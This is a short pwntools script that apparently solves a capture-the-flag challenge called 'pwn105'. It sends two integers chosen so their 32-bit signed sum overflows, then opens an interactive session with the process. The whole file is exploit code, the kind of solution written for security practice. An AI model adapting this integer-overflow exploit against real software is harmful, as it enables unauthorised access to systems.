from pwn import *

DEBUG=0

if DEBUG == 0:
    p = process('./pwn105')
else:
    p = remote('', 9005)

max_signed_int = 2**31 - 1 # 32 bit
    
p.recvline(b">>")
p.sendline(str(max_signed_int // 2))
p.recvline(b">>")
p.sendline(str((max_signed_int // 2) + 2))
p.interactive()

        
